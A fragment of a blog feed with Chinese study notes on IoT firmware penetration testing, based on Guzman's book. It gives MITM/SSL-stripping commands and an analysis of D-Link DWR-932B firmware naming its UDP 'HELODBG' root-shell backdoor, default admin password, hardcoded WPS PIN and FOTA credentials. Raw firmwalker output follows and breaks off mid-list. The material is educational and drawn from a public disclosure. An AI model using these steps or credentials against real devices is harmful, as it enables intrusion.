    <content type="html"><![CDATA[<blockquote><p>本文内容是基于《物联网渗透测试》-美·亚伦古兹曼的学习总结</p></blockquote><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><ul><li><p>在硬件厂商网站内直接下载</p></li><li><p>固件更新时，利用中间人攻击，转发代理流量</p></li><li><p>通过物理连接，直接从设备转储固件。固件存储为bin文件指令:</p><p> <code>$ flashrom -p ft2232_spi:type=232H -r spidump.bin</code></p></li><li><p>利用搜索引擎搜集固件，还可以利用 <a href="https://www.exploit-db.com/google-hacking-database">Google Hacking数据库</a>搜索固件或设备</p></li></ul><p><img src="/img/article/iot-1/image-20220914135931400.png" alt="image-20220914135931400"></p><h3 id="MITM转发代理流量流程"><a href="#MITM转发代理流量流程" class="headerlink" title="MITM转发代理流量流程"></a>MITM转发代理流量流程</h3><blockquote><p>接下来，我们简要介绍了如何使用Kali Linux、SSLstrip、 Ettercap和Wireshark搭建MITM测试环境，以在设备更新期间捕获设备 流量</p></blockquote><ol><li><p>启用IP转发功能<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p></li><li><p>配置iptables，将目的端口80的流量重定向至SSLstrip监听的端口10000。<code>iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000</code></p></li><li><p>启动SSLstrips: <code>sslstrip -a</code></p></li><li><p>启动Ettercap GUI：<code>ettercap -G</code></p></li></ol><p><img src="/img/article/iot-1/image-20220914134344716.png" alt="image-20220914134344716"></p><ol start="5"><li>在<code>primary interface</code>选择要监听的设备，这里选择网卡<code>eth0</code></li><li>启动Wireshark程序，对<code>eth0</code>进行抓包</li></ol><p><img src="/img/article/iot-1/image-20220914135308518.png" alt="image-20220914135308518"></p><ol start="7"><li>根据实际需求过滤关注的报文</li></ol><h2 id="固件文件分析"><a href="#固件文件分析" class="headerlink" title="固件文件分析"></a>固件文件分析</h2><blockquote><p>一般直接使用 <code>binwalk -eM file.bin</code> 即可分解文件</p></blockquote><h3 id="D-Link-923B固件文件系统获取"><a href="#D-Link-923B固件文件系统获取" class="headerlink" title="D-Link 923B固件文件系统获取"></a>D-Link 923B固件文件系统获取</h3><blockquote><p>固件压缩包<a href="https://media.dlink.eu/ftp/products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_02_eu_en_20150709.zip">下载链接</a>，版本号为DWR-932_fw_revB_2_02_eu_en_20150709。安全研究员Gianni Carabelli和Pierre Kim已经在这款固件中挖掘出了漏洞，这里我们只是用于练习</p></blockquote><p>首先是从固件中提取文件系统，内有加密过的zip压缩包，可以使用<code>fcrackzip</code>进行密码爆破，这里省略爆破过程，直接输入密码 <strong>beUT9Z</strong></p><p><img src="/img/article/iot-1/image-20220914145816127.png" alt="压缩包已加密"></p><p>接下来可以使用针对yaffs2格式 的工具解压文件系统来提取2K-mdm-image-mdm9625.yaffs2文件，也可以直接通过Binwalk来完成提取工作。</p><blockquote><p>这里我采用的是unyaffs，下载链接 <a href="https://code.google.com/archive/p/unyaffs/downloads">Google Code Archive - Long-term storage for Google Code Project Hosting.</a></p></blockquote><p>下载可执行程序后，使用<code>./unyaffs file.yaffs2</code>指令即可</p><p><img src="/img/article/iot-1/image-20220914192637485.png" alt="image-20220914192637485"></p><p><img src="/img/article/iot-1/image-20220914192719147.png" alt="解压出的文件系统"></p><h3 id="手动信息挖掘"><a href="#手动信息挖掘" class="headerlink" title="手动信息挖掘"></a>手动信息挖掘</h3><p>然后我们需要在这个文件目录中查找有用的信息，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.conf&quot;</span><br>find . -name <span class="hljs-string">&quot;shadow&quot;</span><br>find . -name <span class="hljs-string">&quot;passwd&quot;</span><br>find . -name <span class="hljs-string">&quot;*config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*history*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh*_config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh_host*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914194404354.png" alt="搜索示例"></p><p>在<code>inadyn-mt.conf </code>文件中存储了路由器的no-IP配置信息，包括用于访问网站 <a href="https://www.no-ip.com/">no-ip</a>的用户名和口令</p><p><img src="/img/article/iot-1/image-20220914195009565.png" alt="image-20220914195009565"></p><p>查看shadow文件</p><p><img src="/img/article/iot-1/image-20220914195346782.png" alt="image-20220914195346782"></p><p>查看passwd文件</p><p><img src="/img/article/iot-1/image-20220914195118433.png" alt="image-20220914195118433"></p><h3 id="利用Firmwalker搜索敏感信息"><a href="#利用Firmwalker搜索敏感信息" class="headerlink" title="利用Firmwalker搜索敏感信息"></a>利用Firmwalker搜索敏感信息</h3><p>安装firmwalker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i -g eslint                                                                       <br><br>git <span class="hljs-built_in">clone</span> https://github.com/craigz28/firmwalker.git <br></code></pre></td></tr></table></figure><p>使用方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./firmwalker.sh &#123;floder path&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Firmwalker脚本能够识别出多种敏感信息，包括二进制文件、 证书、IP地址、私钥等，同时将输出结果都保存在<strong>firmwalker.txt</strong>文 件之中</p></blockquote><p><img src="/img/article/iot-1/image-20220914202334231.png" alt="image-20220914202334231"></p><p><img src="/img/article/iot-1/image-20220914204146429.png" alt="firmwalker.txt"></p><h3 id="查看启动项"><a href="#查看启动项" class="headerlink" title="查看启动项"></a>查看启动项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/init.d<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914214159035.png" alt="image-20220914214159035"></p><p>这里可以查看 <strong>start_appmgr</strong>脚本，一般来说mgr就是主控程序的意思  </p><p><img src="/img/article/iot-1/image-20220914214951502.png" alt="image-20220914214951502"></p><p>可以看到该脚本在开机时会以服务的形式运行<code>/bin/appmgr</code>程序，同时该脚本还会开启<strong>telnet</strong>服务</p><p><img src="/img/article/iot-1/image-20220914215128332.png" alt="image-20220914215128332"></p><h3 id="appmgr分析"><a href="#appmgr分析" class="headerlink" title="appmgr分析"></a>appmgr分析</h3><p>用IDA PRO打开<code>/bin/appmg</code>程序进行逆向分析，可以发现有一个线程会持续监听 0.0.0.0:39889（UDP）（这个IP和端口还是没有确定出来），并等待传入控制命令,如果某个用户向目标路由器发送了一个 <code>HELODBG</code> 字符串，那么路由器将会执行 <code>/sbin/telnetd -l /bin/sh</code> ，并允许这名用户在未经身份验证的情况下以 root 用户的身份登录路由器。</p><blockquote><p>这里的-11877转换二进制后，末尾两字节为port，前面都是0，末尾字节为<strong>\xD1\x9B</strong>注意小段存储方式，则port号为<strong>9BD1</strong>即<strong>39889</strong></p></blockquote><p><img src="/img/article/iot-1/image-20220914223737117.png" alt="image-20220914223737117"></p><p><img src="/img/article/iot-1/image-20220914223809561.png" alt="image-20220914223809561"></p><p>搜索 <strong>mod_sysadm_config_passwd</strong> 函数，可以得到admin默认密码</p><p><img src="/img/article/iot-1/image-20220914231714471.png" alt="image-20220914231714471"></p><p>路由器的管理员账号。设备的管理员账号默认为“admin”，而密码同样也是“admin”。</p><p>搜索 <strong>wifi_get_default_wps_pin</strong> 函数</p><p><img src="/img/article/iot-1/image-20220914231829944.png" alt="image-20220914231829944"></p><p>默认配置下，该路由器 WPS 系统的 PIN 码永远都是 <code>28296607</code> 因为这个 PIN 码是硬编码在 <code>/bin/appmgr</code> 程序中</p><h3 id="fotad-分析"><a href="#fotad-分析" class="headerlink" title="fotad 分析"></a>fotad 分析</h3><p>路由器与 FOTA 服务器进行通信时的凭证数据硬编码在 <code>/sbin/fotad</code> 代码中，我们用 IDA 进行分析</p><p>搜索 <code>sub_CAAC </code>函数,可以发现被 base64 过的凭证</p><p><img src="/img/article/iot-1/image-20220914232237866.png" alt="image-20220914232237866"></p><p>用户&#x2F;密码如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cWRwYzpxZHBj        qdpc:qdpc<br>cWRwZTpxZHBl        qdpe:qdpe<br><span class="hljs-attribute">cWRwOnFkcA</span>==        qdp:qdp<br></code></pre></td></tr></table></figure><h3 id="UPnP安全问题"><a href="#UPnP安全问题" class="headerlink" title="UPnP安全问题"></a>UPnP安全问题</h3><p>UPnP 允许用户动态添加防火墙规则。因为这种做法会带来一定的安全风险，因此设备通常都会对这种操作进行限制，以避免不受信任的客户端添加不安全的防火墙规则。</p><p>UPnP 的不安全性早在2006年就已经是众所周知的事情了。而该路由器中 UPnP 程序的安全等级仍然非常的低，处于局域网内的攻击者可以随意修改路由器的端口转发规则。</p><p>文件 <code>/var/miniupnpd.conf</code> 是由 <code>/bin/appmgr</code> 程序生成的：</p><p>搜索 sub_2AE0C 函数</p><p><img src="/img/article/iot-1/image-20220914232710172.png" alt="image-20220914232710172"></p><p>该程序会生成 <code>/var/miniupnpd.conf</code>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ext_ifname</span>=rmnet0<br><span class="hljs-attr">listening_ip</span>=bridge0<br><span class="hljs-attr">port</span>=<span class="hljs-number">2869</span><br><span class="hljs-attr">enable_natpmp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">enable_upnp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">bitrate_up</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">bitrate_down</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">secure_mode</span>=<span class="hljs-literal">no</span>      <span class="hljs-comment"># &quot;secure&quot; mode : when enabled, UPnP client are allowed to add mappings only to their IP.</span><br><span class="hljs-attr">presentation_url</span>=http://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><br><span class="hljs-attr">system_uptime</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">notify_interval</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">upnp_forward_chain</span>=MINIUPNPD<br><span class="hljs-attr">upnp_nat_chain</span>=MINIUPNPD<br></code></pre></td></tr></table></figure><h2 id="基于固件仿真的动态分析"><a href="#基于固件仿真的动态分析" class="headerlink" title="基于固件仿真的动态分析"></a>基于固件仿真的动态分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装<strong>FAT(Firmware-Analysis-Toolkit)<strong>，执行以下命令即可，但需注意环境需同时具有</strong>python2</strong>和<strong>python3</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>Kali和Ubuntu安装都出现了一些问题人麻了</p></blockquote><p><img src="/img/article/iot-1/image-20220914212925067.png" alt="Ubuntu安装错误"></p><p>Kali则是报找不到<strong>Package ‘lsb-core’ has no installation candidate</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-Link 923B路由器敏感信息搜集</title>
    <link href="/2022/09/14/firmwalker-DLINK923B/"/>
    <url>/2022/09/14/firmwalker-DLINK923B/</url>
    
    <content type="html"><![CDATA[<p><em><strong>Firmware Directory</strong></em><br>&#x2F;root&#x2F;iot&#x2F;D-LINK923B&#x2F;2k&#x2F;root<br><em><strong>Search for password files</strong></em><br>##################################### passwd<br>t&#x2F;bin&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd</p><p>##################################### shadow<br>t&#x2F;etc&#x2F;shadow</p><p>##################################### *.psk</p><p><em><strong>Search for Unix-MD5 hashes</strong></em></p><p><em><strong>Search for SSL related files</strong></em><br>##################################### *.crt</p><p>##################################### *.pem</p><p>##################################### *.cer</p><p>##################################### *.p7b</p><p>##################################### *.p12</p><p>##################################### *.key</p><p><em><strong>Search for SSH related files</strong></em><br>##################################### authorized_keys</p><p>##################################### <em>authorized_keys</em></p><p>##################################### host_key</p><p>##################################### <em>host_key</em></p><p>##################################### id_rsa</p><p>##################################### <em>id_rsa</em></p><p>##################################### id_dsa</p><p>##################################### <em>id_dsa</em></p><p>##################################### *.pub</p><p><em><strong>Search for files</strong></em><br>##################################### *.conf<br>t&#x2F;etc&#x2F;wpa_supplicant.conf<br>t&#x2F;etc&#x2F;avahi&#x2F;avahi-daemon.conf<br>t&#x2F;etc&#x2F;pimd.conf<br>t&#x2F;etc&#x2F;mdev.conf<br>t&#x2F;etc&#x2F;AR6004_AP1_hostapd.conf<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;session.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.conf<br>t&#x2F;etc&#x2F;hostapd.conf<br>t&#x2F;etc&#x2F;host.conf<br>t&#x2F;etc&#x2F;AR6003_hostapd.conf<br>t&#x2F;etc&#x2F;igd&#x2F;miniupnpd.conf<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;AR6004_hostapd.conf<br>t&#x2F;etc&#x2F;radvd.conf<br>t&#x2F;etc&#x2F;AR6003_AP1_hostapd.conf</p><p>##################################### *.cfg</p><p>##################################### *.ini</p><p><em><strong>Search for database related files</strong></em><br>##################################### *.db</p><p>##################################### *.sqlite</p><p>##################################### *.sqlite3</p><p><em><strong>Search for shell scripts</strong></em><br>##################################### shell scripts<br>t&#x2F;etc&#x2F;rc4.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;usb.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automountsdcard.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automounthdd.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;find-touchscreen.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gdbus-bash-completion.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gsettings-bash-completion.sh<br>t&#x2F;etc&#x2F;rc2.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S04modutils.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02sysfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S38devpts.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S06alignment.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S45mountnfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S39hostname.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S10checkroot.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02banner.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S37populate-volatile.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S35mountall.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S55bootmisc.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S01keymap.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;modutils.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;banner.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;devpts.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hostname.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;save-rtc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;sysfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;set-hwver.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;keymap.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountall.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;alignment.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;rmnologin.sh<br>t&#x2F;etc&#x2F;rc5.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;qdt_rc0clean.sh<br>t&#x2F;etc&#x2F;rc3.d&#x2F;S99rmnologin.sh</p><p><em><strong>Search for other .bin files</strong></em><br>##################################### bin files<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;bdata.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;fw-3.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;utf.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;bdata.SD31.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athtcmd_ram.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;data.patch.hw3_0.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athwlan_router.bin</p><p><em><strong>Search for patterns in files</strong></em><br>——————– upgrade ——————–<br>t&#x2F;sbin&#x2F;fotad<br>t&#x2F;bin&#x2F;lcdd<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;lcdtest<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.prerm</p><p>——————– admin ——————–<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;cgi-bin&#x2F;qcmap_auth<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst</p><p>——————– root ——————–<br>t&#x2F;sbin&#x2F;ip.iproute2<br>t&#x2F;sbin&#x2F;readprofile.util-linux<br>t&#x2F;sbin&#x2F;shutdown.sysvinit<br>t&#x2F;sbin&#x2F;fdisk.util-linux<br>t&#x2F;sbin&#x2F;dnsmasq_qmi<br>t&#x2F;sbin&#x2F;swapon.util-linux<br>t&#x2F;sbin&#x2F;dlna6_dms<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;sbin&#x2F;miniupnpd<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;sbin&#x2F;ctrlaltdel<br>t&#x2F;sbin&#x2F;killall5<br>t&#x2F;sbin&#x2F;cfdisk<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;default&#x2F;volatiles&#x2F;00_core<br>t&#x2F;etc&#x2F;shadow<br>t&#x2F;etc&#x2F;securetty<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;limits<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;usb<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;power_config<br>t&#x2F;etc&#x2F;init.d&#x2F;avahi-daemon<br>t&#x2F;etc&#x2F;group<br>t&#x2F;etc&#x2F;udhcpc.d&#x2F;udhcpc.script<br>t&#x2F;etc&#x2F;gshadow<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;group-<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-files.list</p><p>——————– password ——————–<br>t&#x2F;sbin&#x2F;losetup.util-linux<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;tr069&#x2F;param.xml<br>t&#x2F;etc&#x2F;tr069&#x2F;igd_10.xml<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account_Help.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.control<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>——————– passwd ——————–<br>t&#x2F;sbin&#x2F;vipw.shadow<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;amgrevt<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libnss_compat.so.2<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libnss_files.so.2<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mountall.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mdev.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;router.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;tinylogin.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;task-core-boot.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>——————– pwd ——————–<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;pwd</p><p>——————– dropbear ——————–<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postrm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>——————– ssl ——————–<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libcrypto1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libssl1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.list</p><p>——————– private key ——————–<br>t&#x2F;bin&#x2F;agent</p><p>——————– telnet 